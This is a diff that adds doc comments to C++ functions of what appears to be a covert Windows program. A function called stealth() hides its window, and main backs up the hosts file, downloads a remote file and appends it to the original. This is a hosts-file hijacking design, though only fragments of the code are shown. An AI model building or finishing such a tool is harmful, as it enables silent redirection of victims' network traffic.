@@ -19,6 +19,13 @@
 
 using namespace std;
 
+/**
+ * Copies a file
+ * 
+ * @return bool true if successfull
+ * @param string originalFilename
+ * @param string copyFilename
+ */
 bool copyFile(string originalFilename, string copyFilename){
 	bool isSuccessfull = false;
 	ifstream originalStream;
@@ -51,6 +58,12 @@ bool copyFile(string originalFilename, string copyFilename){
 	return isSuccessfull;
 }
 
+/**
+ * Checks if a file already exists
+ * 
+ * @return bool true if the specified file exists
+ * @param string filename
+ */
 bool existsFile(string filename){
 	bool isSuccessfull = false;
 	ifstream fileStream;
@@ -65,6 +78,14 @@ bool existsFile(string filename){
 	return isSuccessfull;
 }
 
+/**
+ * Combines both source files to the specified target file
+ * 
+ * @return void
+ * @param string targetFile
+ * @param string sourceFile1
+ * @param string sourcefile2
+ */
 void glueFiles(string targetFile, string sourceFile1, string sourcefile2){
 	ifstream inputStream1;
 	ifstream inputStream2;
@@ -110,6 +131,13 @@ void glueFiles(string targetFile, string sourceFile1, string sourcefile2){
 	}
 }
 
+/**
+ * Retrieves a file from the internet
+ * 
+ * @return int returns 1 if successfull
+ * @param string requesturlPar	The file url on the net
+ * @param string outputfilePar	Location of retrieved file
+ */
 int InternetSaveFile(string requesturlPar, string outputfilePar)
 {
 	const char *requesturl = requesturlPar.c_str();
@@ -155,6 +183,11 @@ int InternetSaveFile(string requesturlPar, string outputfilePar)
 	return 1;
 } 
 
+/**
+ * Suppresses all noise and windows
+ *
+ * @return void
+ */
 void stealth()
 {
      HWND stealth;
@@ -163,6 +196,12 @@ void stealth()
      ShowWindow(stealth,0);
 }
 
+/**
+ * The main application. 
+ * Creates a backup of the hostfile, downloads the remote file and combines it with the original file
+ *
+ * @return int 0 if successfull
+ */
 int main(){
     stealth();
     
